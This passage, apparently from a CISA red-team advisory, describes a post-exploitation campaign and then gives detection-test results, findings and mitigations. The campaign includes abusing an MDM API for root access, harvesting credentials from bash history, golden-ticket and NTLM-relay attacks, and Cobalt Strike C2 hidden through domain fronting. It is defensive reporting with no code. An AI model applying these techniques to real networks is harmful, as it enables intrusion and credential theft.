<li>Modifying the user’s account by adding <code>Create Policy</code> and <code>Delete Policy</code> permissions [<a href="https://attack.mitre.org/versions/v12/techniques/T1098" title="Account Manipulation">T1098</a>], [<a href="https://attack.mitre.org/versions/v12/techniques/T1548/" title="Abuse Elevation Control Mechanism">T1548</a>].</li>
</ul></li>
<li>Creating a policy via the MDM API [T1106], which instructed Workstation 4 to download and execute a payload to give the team interactive access as root to the workstation.</li>
<li>Verifying their interactive access.</li>
<li>Resetting permissions back to their original state by removing the policy via the MDM API and removing <code>Create Policy</code> and <code>Delete Policy</code> and administrator permissions and from the MDM user’s account.</li>
</ol><p>While interacting with Workstation 4, the team found an open SSH socket file and a corresponding <code>netstat</code> connection to a host that the team identified as a bastion host from architecture documentation found on Workstation 4. The team planned to move from Workstation 4 to the bastion host to SBS 1. <strong>Note:</strong> A SSH socket file allows a user to open multiple SSH sessions through a single, already authenticated SSH connection without additional authentication.</p>
<p>The team could not take advantage of the open SSH socket. Instead, they searched through SBS 1 architecture diagrams and documentation on Workstation 4. They found a security operations (SecOps) network diagram detailing the network boundaries between Site 5 SecOps on-premises systems, Site 5 non-SecOps on-premises systems, and Site 5 SecOps cloud infrastructure. The documentation listed the SecOps cloud infrastructure IP ranges [<a href="https://attack.mitre.org/versions/v12/techniques/T1580/" title="Cloud Infrastructure Discovery">T1580</a>]. These “trusted” IP addresses were a public <code>/16</code> subnet; the team was able to request a public IP in that range from the same cloud provider, and Workstation 4 made successful outbound SSH connections to this cloud infrastructure. The team intended to use that connection to reverse tunnel traffic back to the workstation and then access the bastion host via the open SSH socket file. However, Phase 1 ended before they were able to implement this plan.</p>
<h5><em>Attempts to Access SBS 2</em></h5>
<p>Conducting open-source research, the team identified an organizational branch [<a href="https://attack.mitre.org/versions/v12/techniques/T1591/" title="Gather Victim Org Information">T1591</a>] that likely had access to SBS 2. The team queried the AD to identify the branch’s users and administrators. The team gathered a list of potential accounts, from which they identified administrators, such as <code>SYSTEMS ADMIN</code> or <code>DATA SYSTEMS ADMINISTRATOR</code>, with technical roles. Using their access to the MDM MySQL database, the team queried potential targets to (1) determine the target’s last contact time with the MDM and (2) ensure any policy targeting the target’s workstation would run relatively quickly [<a href="https://attack.mitre.org/versions/v12/techniques/T1596/005/" title="Search Open Technical Databases: Scan Databases">T1596.005</a>]. Using the same methodology as described by the steps in the Plan for Potential Access to SBS 1 section above, the team gained interactive root access to two Site 6 SBS 2-connected workstations: a software engineering workstation (Workstation 5) and a user administrator workstation (Workstation 6).</p>
<p>The Workstation 5 user had bash history files with what appeared to be SSH passwords mistyped into the bash prompt and saved in bash history [<a href="https://attack.mitre.org/versions/v12/techniques/T1552/003/" title="Unsecured Credentials: Bash History">T1552.003</a>]. The team then attempted to authenticate to SBS 2 using a similar tunnel setup as described in the Access to SBS 1 section above and the potential credentials from the user’s bash history file. However, this attempt was unsuccessful for unknown reasons.</p>
<p>On Workstation 6, the team found a <code>.txt</code> file containing plaintext credentials for the user. Using the pattern discovered in these credentials, the team was able to crack the user’s workstation account password [<a href="https://attack.mitre.org/versions/v12/techniques/T1110/002/" title="Brute Force: Password Cracking">T1110.002</a>]. The team also discovered potential passwords and SSH connection commands in the user’s bash history. Using a similar tunnel setup described above, the team attempted to log into SBS 2. However, a prompt for an MFA passcode blocked this attempt.</p>
<p>See figure 2 for a timeline of the team’s post exploitation activity that includes key points of access.</p>



<figure class="c-figure c-figure--image u-align-center" role="group"><div class="c-figure__media">    <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/large/public/2023-03/figure_2.jpg?itok=weNTd6WE" width="978" height="647" alt="Figure 2: Red Team Cyber Threat Activity: Post Exploitation" /></div>
      <figcaption class="c-figure__caption"><em>Figure 2: Red Team Cyber Threat Activity: Post Exploitation</em></figcaption></figure><h5><em>Command and Control</em></h5>
<p>The team used third-party owned and operated infrastructure and services [<a href="https://attack.mitre.org/versions/v12/techniques/T1583/">T1583</a>] throughout their assessment, including in certain cases for command and control (C2) [<a href="https://attack.mitre.org/versions/v12/tactics/TA0011/">TA0011</a>]. These included:</p>
<ul><li><a href="https://attack.mitre.org/versions/v12/software/S0154/" title="Cobalt Strike">Cobalt Strike</a> and Merlin payloads for C2 throughout the assessment. <strong>Note:</strong> Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic.
<ul><li>The team maintained multiple Cobalt Strike servers hosted by a cloud vendor. They configured each server with a different domain and used the servers for communication with compromised hosts. These servers retained all assessment data.</li>
</ul></li>
<li>Two commercially available cloud-computing platforms.
<ul><li>The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers [<a href="https://attack.mitre.org/versions/v12/techniques/T1090/002/">T1090.002</a>]. Redirecting servers make it difficult for defenders to attribute assessment activities to the backend team servers. The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers [<a href="https://attack.mitre.org/versions/v12/techniques/T1071/002/">T1071.002</a>]. The team encrypted all data in transit [<a href="https://attack.mitre.org/versions/v12/techniques/T1573/">T1573</a>] using encryption keys stored on team’s Cobalt Strike servers.</li>
</ul></li>
<li>A cloud service to rapidly change the IP address of the team’s redirecting servers in the event of detection and eradication.</li>
<li>Content delivery network (CDN) services to further obfuscate some of the team’s C2 traffic.
<ul><li>This technique leverages CDNs associated with high-reputation domains so that the malicious traffic appears to be directed towards a reputation domain but is actually redirected to the red team-controlled Cobalt Strike servers.</li>
<li>The team used domain fronting [<a href="https://attack.mitre.org/versions/v12/techniques/T1090/004/">T1090.004</a>] to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating. This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team’s redirect server.</li>
</ul></li>
</ul><h5>Phase II: Red Team Measurable Events Activity</h5>
<p>The red team executed 13 measurable events designed to provoke a response from the people, processes, and technology defending the organization’s network. See Table 1 for a description of the events, the expected network defender activity, and the organization’s actual response.</p>
<table class="MsoTableGrid tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 1: Measurable Events</em></caption>
<thead><tr><td>
<p><strong>Measurable Event</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>MITRE ATT&CK Technique(s)</strong></p>
</td>
<td>
<p><strong>Expected Detection Points</strong></p>
</td>
<td>
<p><strong>Expected Network Defender Reactions</strong></p>
</td>
<td>
<p><strong>Reported Reactions</strong></p>
</td>
</tr></thead><tbody><tr><td>
<p>Internal Port Scan</p>
</td>
<td>
<p>Launch scan from inside the network from a previously gained workstation to enumerate ports on target workstation, server, and domain controller system(s).</p>
</td>
<td>
<ul><li>Network Service Discovery [<a href="https://attack.mitre.org/versions/v12/techniques/T1046/" title="Network Service Discovery">T1046</a>]</li>
</ul></td>
<td>
<ul><li>Network Monitoring and Analysis Tools</li>
<li>Intrusion Detection or Prevention Systems</li>
<li>Endpoint Protection Platform</li>
</ul></td>
<td>
<ul><li>Detect target hosts and ports</li>
<li>Identify associated scanning process</li>
<li>Analyze scanning host once detected</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p> </p>
<p>Comprehensive Active Directory and Host Enumeration</p>
</td>
<td>
<p>Perform AD enumeration by querying all domain objects from the DC; and enumerating trust relationships within the AD Forest, user accounts, and current session information from every domain computer (Workstation and Server).</p>
</td>
<td>
<ul><li>Domain Trust Discovery [<a href="https://attack.mitre.org/versions/v12/techniques/T1482/" title="Domain Trust Discovery">T1482</a>]</li>
<li>Account Discovery: Domain Account [<a href="https://attack.mitre.org/versions/v12/techniques/T1087/002/" title="Account Discovery: Domain Account">T1087.002</a>]</li>
<li>System Owner/User Discovery [<a href="https://attack.mitre.org/versions/v12/techniques/T1033/" title="System Owner/User Discovery">T1033</a>]</li>
<li>Remote System Discovery [<a href="https://attack.mitre.org/versions/v12/techniques/T1018/" title="https://attack.mitre.org/versions/v12/techniques/T1018/">T1018</a>]</li>
</ul></td>
<td>
<ul><li>Network Monitoring and Analysis Tools</li>
<li>Intrusion Detection or Prevention Systems</li>
<li>Endpoint Protection Platform</li>
</ul></td>
<td>
<ul><li>Detect target hosts and ports</li>
<li>Identify associated scanning process</li>
<li>Analyze scanning host once detected</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>Collection process stopped before completion. Host isolated and sent for forensics.</p>
</td>
</tr><tr><td>
<p>Data Exfiltration—1 GB of Data</p>
</td>
<td>
<p>Send a large amount (1 GB) of mock sensitive information to an external system over various protocols, including ICMP, DNS, FTP, and/or HTTP/S.</p>
</td>
<td>
<ul><li>Exfiltration Over Alternative Protocol [<a href="https://attack.mitre.org/versions/v12/techniques/T1048/" title="Exfiltration Over Alternative Protocol">T1048</a>]</li>
</ul></td>
<td>
<ul><li>Network Monitoring and Analysis Tools</li>
<li>Intrusion Detection or Prevention Systems</li>
<li>Endpoint Protection Platform</li>
</ul></td>
<td>
<ul><li>Detect target hosts and ports</li>
<li>Identify associated scanning process</li>
<li>Analyze scanning host once detected</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Malicious Traffic Generation—Workstation to External Host</p>
</td>
<td>
<p>Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP.</p>
</td>
<td>
<ul><li>Application Layer Protocol [<a href="https://attack.mitre.org/versions/v12/techniques/T1071" title="Application Layer Protocol">T1071</a>]</li>
</ul></td>
<td>
<ul><li>Intrusion Detection or Prevention Systems</li>
<li>Endpoint Protection Platform</li>
<li>Windows Event Logs</li>
</ul></td>
<td>
<ul><li>Detect and Identify source IP and source process of enumeration</li>
<li>Analyze scanning host once detected</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Active Directory Account Lockout</p>
</td>
<td>
<p>Lock out several administrative AD accounts</p>
</td>
<td>
<ul><li>Account Access Removal [<a href="https://attack.mitre.org/versions/v12/techniques/T1531/" title="Account Access Removal">T1531</a>]</li>
</ul><p> </p>
</td>
<td>
<ul><li>Windows Event Logs</li>
<li>End User Reporting</li>
</ul></td>
<td>
<ul><li>Detect and Identify source IP and source process of exfiltration</li>
<li>Analyze host used for exfiltration once detected</li>
</ul><p>Develop response plan</p>
</td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Local Admin User Account Creation (workstation)</p>
</td>
<td>
<p>Create a local administrator account on a target workstation system.</p>
</td>
<td>
<ul><li>Create Account: Local Account [<a href="https://attack.mitre.org/versions/v12/techniques/T1136/001/" title="Create Account: Local Account">T1136.001</a>]</li>
<li>Account Manipulation [<a href="https://attack.mitre.org/versions/v12/techniques/T1098/" title="Account Manipulation">T1098</a><u>]</u></li>
</ul></td>
<td>
<ul><li>Intrusion Detection or Prevention Systems</li>
<li>Endpoint Protection Platform</li>
<li>Web Proxy Logs</li>
</ul></td>
<td>
<ul><li>Detect and identify source IP and source process of malicious traffic</li>
<li>Investigate destination IP address</li>
<li>Triage compromised host</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Local Admin User Account Creation (server)</p>
</td>
<td>
<p>Create a local administrator account on a target server system.</p>
</td>
<td>
<ul><li>Create Account: Local Account [<a href="https://attack.mitre.org/versions/v12/techniques/T1136/001/" title="Create Account: Local Account">T1136.001</a>]</li>
<li>Account Manipulation [<a href="https://attack.mitre.org/versions/v12/techniques/T1098/" title="Account Manipulation">T1098</a><u>]</u></li>
</ul></td>
<td>
<ul><li>Windows Event Logs</li>
</ul></td>
<td>
<ul><li>Detect account creation</li>
<li>Identify source of change</li>
<li>Verify change with system owner</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Active Directory Account Creation</p>
</td>
<td>
<p>Create AD accounts and add it to domain admins group</p>
</td>
<td>
<ul><li>Create Account: Domain Account [<a href="https://attack.mitre.org/versions/v12/techniques/T1136/002" title="Create Account: Domain Account">T1136.002</a>]</li>
<li>Account Manipulation [<a href="https://attack.mitre.org/versions/v12/techniques/T1098/" title="Account Manipulation">T1098</a>]</li>
</ul></td>
<td>
<ul><li>Windows Event Logs</li>
</ul></td>
<td>
<ul><li>Detect account creation</li>
<li>Identify source of change</li>
<li>Verify change with system owner</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Workstation Admin Lateral Movement—Workstation to Workstation</p>
</td>
<td>
<p>Use a previously compromised workstation admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations.</p>
<p> </p>
</td>
<td>
<ul><li>Valid Accounts: Domain Accounts [<a href="https://attack.mitre.org/versions/v12/techniques/T1078/002/" title="Valid Accounts: Domain Accounts">T1078.002</a>]</li>
<li>Remote Services: SMB/Windows Admin Shares, Sub-technique [<a href="https://attack.mitre.org/versions/v12/techniques/T1021/002/" title="Remote Services: SMB/Windows Admin Shares">T1021.002</a>]</li>
<li>Create or Modify System Process: Windows Service [<a href="https://attack.mitre.org/versions/v12/techniques/T1543/003/" title="Create or Modify System Process: Windows Service">T1543.003</a>]</li>
</ul></td>
<td>
<ul><li>Windows Event Logs</li>
</ul></td>
<td>
<ul><li>Detect account compromise</li>
<li>Analyze compromised host</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Domain Admin Lateral Movement—Workstation to Domain Controller</p>
</td>
<td>
<p>Use a previously compromised domain admin account to upload and execute a payload via SMB and Windows Service Creation, respectively, on a target DC.</p>
</td>
<td>
<ul><li>Valid Accounts: Domain Accounts [<a href="https://attack.mitre.org/versions/v12/techniques/T1078/002/" title="Valid Accounts: Domain Accounts">T1078.002</a>]</li>
<li>Remote Services: SMB/Windows Admin Shares, Sub-technique [<a href="https://attack.mitre.org/versions/v12/techniques/T1021/002/" title="Remote Services: SMB/Windows Admin Shares">T1021.002</a>]</li>
<li>Create or Modify System Process: Windows Service [<a href="https://attack.mitre.org/versions/v12/techniques/T1543/003/" title="Create or Modify System Process: Windows Service">T1543.003</a>]</li>
</ul></td>
<td>
<ul><li>Windows Event Logs</li>
</ul></td>
<td>
<ul><li>Detect account compromise</li>
<li>Triage compromised host</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Malicious Traffic Generation—Domain Controller to External Host</p>
</td>
<td>
<p>Establish a session that originates from a target Domain Controller system directly to an external host over a clear text protocol, such as HTTP.</p>
</td>
<td>
<ul><li>Application Layer Protocol [<a href="https://attack.mitre.org/versions/v12/techniques/T1071" title="Application Layer Protocol">T1071</a>]</li>
</ul></td>
<td>
<ul><li>Intrusion Detection or Prevention Systems</li>
<li>Endpoint Protection Platform</li>
<li>Web Proxy Logs</li>
</ul></td>
<td>
<ul><li>Detect and identify source IP and source process of malicious traffic</li>
<li>Investigate destination IP address</li>
<li>Triage compromised host</li>
</ul><p>Develop response plan</p>
</td>
<td>
<p>None</p>
</td>
</tr><tr><td>
<p>Trigger Host-Based Protection—Domain Controller</p>
</td>
<td>
<p>Upload and execute a well-known (e.g., with a signature) malicious file to a target DC system to generate host-based alerts.</p>
</td>
<td>
<ul><li>Ingress Tool Transfer [<a href="https://attack.mitre.org/versions/v12/techniques/T1105/" title="Ingress Tool Transfer">T1105</a>]</li>
</ul></td>
<td>
<ul><li>Endpoint Protection Platform</li>
<li>Endpoint Detection and Response</li>
</ul></td>
<td>
<ul><li>Detect and identify source IP and source process of malicious traffic</li>
<li>Investigate destination IP address</li>
<li>Triage compromised host</li>
<li>Develop response plan</li>
</ul></td>
<td>
<p>Malicious file was removed by antivirus</p>
</td>
</tr><tr><td>
<p>Ransomware Simulation</p>
</td>
<td>
<p>Execute simulated ransomware on multiple Workstation systems to simulate a ransomware attack.</p>
<p>Note: This technique does NOT encrypt files on the target system.</p>
</td>
<td>
<p>N/A</p>
</td>
<td>
<ul><li>End User Reporting</li>
</ul></td>
<td>
<ul><li>Investigate end user reported event</li>
<li>Triage compromised host</li>
<li>Develop response Plan</li>
</ul></td>
<td>
<p>Four users reported event to defensive staff</p>
</td>
</tr></tbody></table><h5>Findings</h5>
<h5><em>Key Issues</em></h5>
<p>The red team noted the following key issues relevant to the security of the organization’s network. These findings contributed to the team’s ability to gain persistent, undetected access across the organization’s sites. See the Mitigations section for recommendations on how to mitigate these issues.</p>
<ul><li><strong>Insufficient host and network monitoring.</strong> Most of the red team’s Phase II actions failed to provoke a response from the people, processes, and technology defending the organization’s network. The organization failed to detect lateral movement, persistence, and C2 activity via their intrusion detection or prevention systems, endpoint protection platform, web proxy logs, and Windows event logs. Additionally, throughout Phase I, the team received no deconflictions or confirmation that the organization caught their activity. Below is a list of some of the higher risk activities conducted by the team that were opportunities for detection:
<ul><li>Phishing</li>
<li>Lateral movement reuse</li>
<li>Generation and use of the golden ticket</li>
<li>Anomalous LDAP traffic</li>
<li>Anomalous internal share enumeration</li>
<li><code>Unconstrained Delegation</code> server compromise</li>
<li><code>DCSync</code></li>
<li>Anomalous account usage during lateral movement</li>
<li>Anomalous outbound network traffic</li>
<li>Anomalous outbound SSH connections to the team’s cloud servers from workstations</li>
</ul></li>
<li><strong>Lack of monitoring on endpoint management systems.</strong> The team used the organization’s MDM system to gain root access to machines across the organization’s network without being detected. Endpoint management systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring.</li>
<li><strong>KRBTGT never changed.</strong> The Site 1 <code>krbtgt</code> account password had not been updated for over a decade. The <code>krbtgt</code> account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain. Compromise of the <code>krbtgt</code> account could provide adversaries with the ability to sign their own TGTs, facilitating domain access years after the date of compromise. The red team was able to use the <code>krbtgt</code> account to forge TGTs for multiple accounts throughout Phase I.</li>
<li><strong>Excessive permissions to standard users.</strong> The team discovered several standard user accounts that have local administrator access to critical servers. This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an <code>Unconstrained Delegation</code> host and compromise the entire domain.</li>
<li><strong>Hosts with <code>Unconstrained Delegation</code> enabled unnecessarily.</strong> Hosts with <code>Unconstrained Delegation</code> enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise <code>krbtgt</code> accounts and perform golden ticket or <a href="https://attack.mitre.org/versions/v12/techniques/T1558/002/" title="Steal or Forge Kerberos Tickets: Silver Ticket">“silver ticket” attacks</a>. The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account.</li>
<li><strong>Use of non-secure default configurations.</strong> The organization used default configurations for hosts with Windows Server 2012 R2. The default configuration allows unprivileged users to query group membership of local administrator groups. The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server.</li>
</ul><h5><em>Additional Issues</em></h5>
<p>The team noted the following additional issues.</p>
<ul><li><strong>Ineffective separation of privileged accounts.</strong> Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server. If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges. Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes.</li>
<li><strong>Lack of server egress control.</strong> Most servers, including domain controllers, allowed unrestricted egress traffic to the internet.</li>
<li><strong>Inconsistent host configuration.</strong> The team observed inconsistencies on servers and workstations within the domain, including inconsistent membership in the local administrator group among different servers or workstations. For example, some workstations had “Server Admins” or “Domain Admins” as local administrators, and other workstations had neither.</li>
<li><strong>Potentially unwanted programs.</strong> The team noticed potentially unusual software, including music software, installed on both workstations and servers. These extraneous software installations indicate inconsistent host configuration (see above) and increase the attack surfaces for malicious actors to gain initial access or escalate privileges once in the network.</li>
<li><strong>Mandatory password changes enabled.</strong> During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified. This is potentially due to domain passwords being required to be changed every 60 days.</li>
<li><strong>Smart card use was inconsistent across the domain.</strong> While the technology was deployed, it was not applied uniformly, and there was a significant portion of users without smartcard protections enabled. The team used these unprotected accounts throughout their assessment to move laterally through the domain and gain persistence.</li>
</ul><h5><em>Noted Strengths</em></h5>
<p>The red team noted the following technical controls or defensive measures that prevented or hampered offensive actions:</p>
<ul><li><strong>The organization conducts regular, proactive penetration tests and adversarial assessments</strong> and invests in hardening their network based on findings.
<ul><li>The team was unable to discover any easily exploitable services, ports, or web interfaces from more than three million external in-scope IPs. This forced the team to resort to phishing to gain initial access to the environment.</li>
<li>Service account passwords were strong. The team was unable to crack any of the hashes obtained from the 610 service accounts pulled. This is a critical strength because it slowed the team from moving around the network in the initial parts of the Phase I.</li>
<li>The team did not discover any useful credentials on open file shares or file servers. This slowed the progress of the team from moving around the network.</li>
</ul></li>
<li><strong>MFA was used for some SBSs.</strong> The team was blocked from moving to SBS 2 by an MFA prompt.</li>
<li><strong>There were strong security controls and segmentation for SBS systems.</strong> Direct access to SBS were located in separate networks, and admins of SBS used workstations protected by local firewalls.</li>
</ul><h4><strong>MITIGATIONS</strong></h4>
<p>CISA recommends organizations implement the recommendations in Table 2 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. See CISA’s <a href="https://www.cisa.gov/cpg" title="Cross-Sector Cybersecurity Performance Goals">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<table class="MsoTableGrid tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 2: Recommendations to Mitigate Identified Issues</em></caption>
<thead><tr><td>
<p><strong>Issue</strong></p>
</td>
<td>
<p><strong>Recommendation</strong></p>
</td>
</tr></thead><tbody><tr><td>
<p>Insufficient host and network monitoring</p>
</td>
<td>
<ul><li><strong>Establish a security baseline of normal network traffic and tune network appliances </strong>to detect anomalous behavior [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.1</a>]. Tune host-based products to detect anomalous binaries, lateral movement, and persistence techniques.</li>
</ul><ul><li>Create alerts for Windows event log authentication codes, especially for the domain controllers. This could help detect some of the pass-the-ticket, DCSync, and other techniques described in this report.</li>
<li>From a detection standpoint, focus on identity and access management (IAM) rather than just network traffic or static host alerts.</li>
</ul><ul><li>Consider who is accessing what (what resource), from where (what internal host or external location), and when (what day and time the access occurs).</li>
<li>Look for access behavior that deviates from expected or is indicative of AD abuse.</li>
</ul><ul><li><strong>Reduce the attack surface by limiting the use of legitimate administrative pathways and tools</strong> such as PowerShell, PSExec, and WMI, which are often used by malicious actors. CISA recommends selecting one tool to administer the network, ensuring logging is turned on [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.1</a>], and disabling the others.</li>
<li><strong>Consider using “honeypot” service principal names (SPNs)</strong> to detect attempts to crack account hashes [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.1</a>].</li>
<li><strong>Conduct regular assessments</strong> to ensure processes and procedures are up to date and can be followed by security staff and end users.</li>
</ul><ul><li>Consider using red team tools, such as SharpHound, for AD enumeration to identify users with excessive privileges and misconfigured hosts (e.g., with <code>Unconstrained Delegation</code> enabled).</li>
</ul><ul><li><strong>Ensure all commercial tools deployed in your environment are regularly tuned</strong> to pick up on relevant activity in your environment.</li>
</ul></td>
</tr><tr><td>
<p>Lack of monitoring on endpoint management systems</p>
</td>
<td>
<ul><li><strong>Treat endpoint management systems as HVAs</strong> with additional restrictions and monitoring because they provide elevated access to thousands of hosts.</li>
</ul></td>
</tr><tr><td>
<p>KRBTGT never changed</p>
</td>
<td>
<ul><li><strong>Change the <code>krbtgt</code> account password on a regular schedule</strong> such as every 6 to 12 months or if it becomes compromised. Note that this password change must be carefully performed to effectively change the credential without breaking AD functionality. The password must be changed twice to effectively invalidate the old credentials. However, the required waiting period between resets must be greater than the maximum lifetime period of Kerberos tickets, which is 10 hours by default. See Microsoft’s <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)#krbtgt-account-maintenance-considerations">KRBTGT account maintenance considerations</a> guidance for more information.</li>
</ul></td>
</tr><tr><td>
<p>Excessive permissions to standard users and ineffective separation of privileged accounts</p>
</td>
<td>
<ul><li>Implement the principle of least privilege:</li>
</ul><ul><li><strong>Grant standard user rights for standard user tasks</strong> such as email, web browsing, and using line-of-business (LOB) applications.</li>
<li><strong>Periodically audit standard accounts</strong> and minimize where they have privileged access.</li>
<li><strong>Periodically Audit AD permissions</strong> to ensure users do not have excessive permissions and have not been added to admin groups.</li>
<li><strong>Evaluate which administrative groups should administer which servers/workstations</strong>. Ensure group members administrative accounts instead of standard accounts.</li>
<li><strong>Separate administrator accounts from user accounts </strong>[<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.5</a>]. Only allow designated admin accounts to be used for admin purposes. If an individual user needs administrative rights over their workstation, use a separate account that does not have administrative access to other hosts, such as servers.</li>
</ul><ul><li><strong>Consider using a privileged access management (PAM) solution</strong> to manage access to privileged accounts and resources <u>[</u><a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 3.4</a>]. PAM solutions can also log and alert usage to detect any unusual activity and may have helped stop the red team from accessing resources with admin accounts. <strong>Note:</strong> password vaults associated with PAM solutions should be treated as HVAs with additional restrictions and monitoring (see below).</li>
<li><strong>Configure time-based access for accounts set at the admin level and higher</strong>. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege, as well as the Zero Trust model. This is a process in which a network-wide policy is set in place to automatically disable administrator accounts at the AD level when the account is not in direct need. When individual users need the account, they submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion.</li>
</ul></td>
</tr><tr><td>
<p>Hosts with <code>Unconstrained Delegation</code> enabled</p>
</td>
<td>
<ul><li><strong>Remove <code>Unconstrained Delegation</code> from all servers</strong>. If <code>Unconstrained Delegation</code> functionality is required, upgrade operating systems and applications to leverage other approaches (e.g., <code>constrained delegation</code>) or explore whether systems can be retired or further isolated from the enterprise. CISA recommends Windows Server 2019 or greater.</li>
<li><strong>Consider disabling or limiting NTLM and WDigest Authentication</strong> if possible, including using their use as criteria for prioritizing updates to legacy systems or for segmenting the network. Instead use more modern federation protocols (SAML, OIDC) or Kerberos for authentication with AES-256 bit encryption <u>[</u><a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.4</a>].</li>
<li>If NTLM must be enabled, <strong>enable Extended Protection for Authentication (EPA) </strong>to prevent some NTLM-relay<strong> attacks, and implement SMB signing</strong> to prevent certain adversary-in-the-middle and pass-the-hash attacks <a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.4</a>]. See Microsoft <a href="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429">Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)</a> and Microsoft <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing">Overview of Server Message Block signing</a> for more information.</li>
</ul></td>
</tr><tr><td>
<p>Use of non-secure default configurations</p>
</td>
<td>
<ul><li><strong>Keep systems and software up to date </strong>[<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 5.1</a>]. If updates cannot be uniformly installed, update insecure configurations to meet updated standards.</li>
</ul></td>
</tr><tr><td>
<p>Lack of server egress control</p>
</td>
<td>
<ul><li><strong>Configure internal firewalls and proxies to restrict internet traffic from hosts that do not require it</strong>. If a host requires specific outbound traffic, consider creating an allowlist policy of domains.</li>
</ul></td>
</tr><tr><td>
<p>Large number of credentials in a shared vault</p>
</td>
<td>
<ul><li><a><strong>Treat password vaults as HVAs</strong> </a>with additional restrictions and monitoring [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.4</a>]:</li>
</ul><ul><li>If on-premise, require MFA for admin and apply network segmentation [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.3</a>]. Use solutions with end-to-end encryption where applicable [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.3</a>].</li>
<li>If cloud-based, evaluate the provider to ensure use of strong security controls such as MFA and end-to-end encryption [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.3, 3.3</a>].</li>
</ul></td>
</tr><tr><td>
<p>Inconsistent host configuration</p>
</td>
<td>
